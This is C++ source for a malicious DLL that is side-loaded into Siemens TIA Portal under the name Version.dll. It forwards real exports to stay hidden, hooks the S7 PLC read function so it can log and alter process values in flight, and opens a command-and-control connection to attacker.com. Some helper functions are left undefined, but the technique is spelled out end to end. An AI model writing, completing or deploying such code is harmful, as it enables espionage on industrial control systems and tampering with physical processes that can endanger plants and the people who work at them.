// malicious_dll.cpp - Side-loaded by TIA Portal
// Compile: cl /LD malicious_dll.cpp /Fe:Version.dll

#include <windows.h>
#include <stdio.h>

// Forward export to legitimate DLL (avoid crashes)
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\Version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\Version.GetFileVersionInfoW")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Execute payload in context of TIA Portal
        CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
    }
    return TRUE;
}

DWORD WINAPI MaliciousThread(LPVOID lpParam) {
    // Hook S7 communication functions
    HMODULE s7_dll = GetModuleHandleA("s7onlinx.dll");
    if (s7_dll) {
        // Find S7 read/write functions
        void* s7_read_fn = GetProcAddress(s7_dll, "S7_Read");

        // Install inline hook (detour)
        InstallHook(s7_read_fn, HookedS7Read);
    }

    // Establish C2 connection
    ConnectToC2("attacker.com", 443);

    return 0;
}

// Hooked S7 read function - intercept all PLC communications
int HookedS7Read(void* plc_handle, void* data, int length) {
    // Log PLC data
    LogToFile("plc_data.bin", data, length);

    // Modify data in-flight if needed
    if (IsCriticalProcess(data)) {
        ModifyProcessValue(data);
    }

    // Call original function
    return OriginalS7Read(plc_handle, data, length);
}
